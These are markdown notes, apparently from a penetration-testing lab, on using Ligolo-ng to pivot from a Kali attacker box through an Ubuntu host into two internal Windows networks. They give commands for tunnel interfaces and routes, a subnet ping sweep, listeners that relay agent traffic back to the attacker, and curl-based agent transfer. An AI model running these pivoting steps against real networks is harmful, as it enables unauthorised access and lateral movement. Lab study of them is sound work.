# Ligolo-ng

#### Line of boxes

Kali (attacker) -- Ubuntu -- Win1 -- Win2

**First create the interface for , it will be the port for the the tunnel for first Pivoit , then start your Ligolo-proxy and transfer your agent to the Ubuntu**

```zsh
sudo ip tuntap add user $(whoami) mode tun ligolo && \
sudo ip link set ligolo up

# start your Ligolo-proxy
ligolo-proxy  -selfcert
```

**If your agent transfer is complete , then connnect it to your ligolo-proxy , then select your session , see the IP and add the subnet route to your ligolo interface in your kali , then start the tunnel via START**

```zsh
# connect the agent
./agent  --connect 10.10.14.62:11601 -ignore-cert

# select the session in Ligolo
session

# add the route to the first interface
sudo ip route add 172.16.5.0/24 dev ligolo

# start the tunnel via start in ligolo
start
```

**Now check if u can ping the Ubuntu internal IP of (172.16.5.15) , if yes then find the Up hosts on that subnet**

```zsh
# Checking
ping 172.16.5.15

# finding up hosts
for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i >/dev/null && echo "[+] Host up: 172.16.5.$i"; done
```

**Now there is 172.16.5.35 is Up with RDP and we have it's creds , we will get the RDP and transfer our agent to that , but we can't cause the WIN1 dosen't know Kali but Ubuntu , So we add a listner to Ligolo for that all the traffic to Ubuntu -p 1111 will be transfered to Kali 1111 , and we can acsess the Kali by WIN1 by using the internal Ip of Ubuntu and -p 1111**

```zsh
listener_add --addr 0.0.0.0:11601 --to 10.10.14.62:11601 --tcp
```

**Now we create new interface in Kali and route the WIN1 internal IP subnet and then transfer the agent and connect it to ligolo**

```zsh
# New interface
sudo ip tuntap add user $(whoami) mode tun ligolo1 && \
sudo ip link set ligolo1 up

# Route
sudo ip route add 172.16.6.0/24 dev ligolo1

# agent transfer
curl -o agent.exe http://172.16.5.15:11601/agent.exe

# agent connect
.\agent --connect 172.16.5.15:11601 -ignore-cert
```

**Then in ligolo**

```zsh
# select the session
session

# start the tunnel
start --tun ligolo1
```

**Then there is another 172.16.6.25 with RDP port open and in that we see there's a another internal IP of 172.16.10.25 , we add a listener in ligolo for WIN1 traffic to Kali and and another listener on -p 1111 to transfer the agent**

```zsh
listener_add --addr 0.0.0.0:11601 --to 10.10.14.62:11601 --tcp

listener_add --addr 0.0.0.0:1111 --to 10.10.14.62:1111 --tcp
```

**Then we create a new interface and route the WIN2 internal subnet**

```zsh
# New interface
sudo ip tuntap add user $(whoami) mode tun ligolo2 && \
sudo ip link set ligolo2 up

# Route
sudo ip route add 172.16.10.0/24 dev ligolo2
```

**Then we connect the agent with WIN1 internal IP**

```zsh
.\agent.exe --connect 172.16.6.35:11601 -ignore-cert
```

**Then in ligolo we select the session and start the tunnel**

```zsh
# start the session
session

# start the tunnel
start --tun ligolo2
```
